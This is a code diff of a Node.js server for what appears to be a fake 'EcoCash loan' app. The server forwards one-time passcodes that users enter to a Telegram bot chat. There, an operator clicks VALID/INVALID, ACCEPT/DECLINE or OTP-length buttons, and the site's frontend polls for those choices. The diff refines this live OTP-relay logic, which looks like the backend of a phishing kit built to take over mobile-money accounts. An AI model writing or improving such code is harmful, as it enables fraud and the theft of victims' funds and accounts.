@@ -5,7 +5,8 @@ const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch
 const app = express();
 
 let otpLength = null;
-let decision = null; // accept or decline
+let applicationDecision = null;
+let otpDecision = null;
 
 app.use(express.json());
 
@@ -41,11 +42,34 @@ async function sendToTelegram(message) {
             { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
           ],
           [
-            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
-            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
+            { text: "✅ ACCEPT", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
+            { text: "❌ DECLINE", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
           ],
           [
             { text: "🔄 RESET", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=reset" }
+          ]
+        ]
+      }
+    })
+  });
+}
+
+async function sendVerificationToTelegram(message) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+  await fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=valid" },
+            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=invalid" }
           ]
         ]
       }
@@ -85,36 +109,22 @@ console.log("SENDING MESSAGE:", message);
 app.get("/telegram-command", (req, res) => {
   const cmd = req.query.cmd;
 
-  if (cmd === "otp5") {
-    otpLength = 5;
-  }
+  if (cmd === "otp5") otpLength = 5;
+  if (cmd === "otp6") otpLength = 6;
 
-  if (cmd === "otp6") {
-    otpLength = 6;
-  }
+  if (cmd === "accept") applicationDecision = "accept";
+  if (cmd === "decline") applicationDecision = "decline";
 
-  if (cmd === "accept") {
-    decision = "accept";
-  }
-
-  if (cmd === "decline") {
-    decision = "decline";
-  }
-
-  if (cmd === "valid") {
-  decision = "valid";
-}
-
-if (cmd === "invalid") {
-  decision = "invalid";
-}
+  if (cmd === "valid") otpDecision = "valid";
+  if (cmd === "invalid") otpDecision = "invalid";
 
   if (cmd === "reset") {
     otpLength = null;
-    decision = null;
+    applicationDecision = null;
+    otpDecision = null;
   }
 
-  console.log("STATE:", { otpLength, decision });
+  console.log("STATE:", { otpLength, applicationDecision, otpDecision });
 
   res.send("OK");
 });
@@ -135,21 +145,28 @@ app.post("/set-otp", (req, res) => {
   res.json({ success: true });
 });
 
+app.get("/otp-decision-status", (req, res) => {
+  res.json({ decision: otpDecision });
+});
+  app.get("/decision-status", (req, res) => {
+  res.json({ decision: applicationDecision });
+});
+
+app.post("/clear-application-decision", (req, res) => {
+  applicationDecision = null;
+  res.json({ success: true });
+});
+
 app.get("/otp-status", (req, res) => {
-  const currentOtp = otpLength;
-
-  otpLength = null; // ✅ RESET AFTER FRONTEND READS IT
-
-  res.json({ otp: currentOtp });
+  res.json({ otp: otpLength });
 });
 
-app.get("/decision-status", (req, res) => {
-  const current = decision;
-  decision = null; // reset after reading
-  res.json({ decision: current });
+app.post("/clear-otp-decision", (req, res) => {
+  otpDecision = null;
+  res.json({ success: true });
 });
 
-app.post("/submit-otp", async (req, res) => {
+    app.post("/submit-otp", async (req, res) => {
   try {
     const { otp } = req.body;
 
@@ -163,7 +180,8 @@ ${otp}
 👇 Choose action below
 `;
 
-    await sendToTelegram(message);
+    // ✅ use correct function
+    await sendVerificationToTelegram(message);
 
     res.json({ success: true });
 
